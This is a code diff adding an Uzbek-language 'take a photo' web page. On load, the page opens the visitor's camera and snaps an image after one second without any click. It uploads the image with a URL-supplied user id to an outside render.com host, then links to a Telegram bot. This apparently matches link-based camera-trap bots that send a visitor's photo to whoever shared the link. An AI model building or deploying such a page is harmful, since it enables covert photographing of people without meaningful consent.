@@ -4,17 +4,116 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Rasmga Olish</title>
-    <link rel="icon" href="favicon.ico" type="image/x-icon"> <!-- Favicon qo‘shildi -->
-    <link rel="stylesheet" href="styles.css">
+    <style>
+        * {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        #container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        video, canvas {
+            width: 100%;
+            border-radius: 10px;
+            margin-bottom: 10px;
+        }
+        #message {
+            font-size: 18px;
+            color: #28a745;
+            font-weight: bold;
+        }
+        .hidden { display: none; }
+    </style>
 </head>
 <body>
+    <div id="container">
+        <h2>📸 Rasmga olish</h2>
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas" class="hidden"></canvas>
+        <p id="message" class="hidden">📤 Rasm yuborilmoqda...</p>
+        <p id="error" class="hidden" style="color: red;"></p>
+        <button id="retry" class="hidden">🔄 Qayta urinish</button>
+    </div>
 
-    <h1>Rasmga tushirilmoqda...</h1>
-    <video id="video" autoplay></video>
-    <canvas id="canvas" style="display: none;"></canvas>
-    <button id="retry" style="display: none;">Qayta urinish</button>
-    <p id="error"></p>
+    <script>
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+        const message = document.getElementById("message");
+        const errorMessage = document.getElementById("error");
+        const retryButton = document.getElementById("retry");
 
-    <script src="script.js"></script>
+        // Kamera ishga tushirish
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    setTimeout(captureImage, 1000); // 3 soniyada rasm oladi
+                })
+                .catch(err => {
+                    console.error("Kameraga ruxsat berilmadi!", err);
+                    errorMessage.innerText = "❌ Kameraga ruxsat berilmadi!";
+                    errorMessage.classList.remove("hidden");
+                    retryButton.classList.remove("hidden");
+                });
+        }
+
+        // Rasm olish va serverga yuborish
+        function captureImage() {
+            if (!video.srcObject) {
+                console.error("Kamera ishlamayapti!");
+                return;
+            }
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL("image/png");
+            const userId = getQueryParam("id");
+
+            message.classList.remove("hidden");
+
+            fetch("https://picture-bot.onrender.com/upload", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ image: imageData, userId })
+            })
+            .then(res => res.json())
+            .then(data => {
+                document.getElementById("container").innerHTML = `
+                    <h2>✅ Rasm muvaffaqiyatli yuborildi!</h2>
+                    <p>Sizning rasmingiz botga yuborildi:</p>
+                    <a href="https://t.me/AsilbekCode_Picture_bot" target="_blank">📤 Rasmni ko‘rish</a>
+                `;
+            })
+            .catch(err => {
+                console.error("Xatolik:", err);
+                errorMessage.innerText = `❌ Xatolik: ${err.message}`;
+                errorMessage.classList.remove("hidden");
+                retryButton.classList.remove("hidden");
+            });
+        }
+
+        // URL'dan query parametr olish
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        // Qayta urinish tugmasi
+        retryButton.addEventListener("click", () => {
+            location.reload();
+        });
+
+        startCamera();
+    </script>
 </body>
 </html>
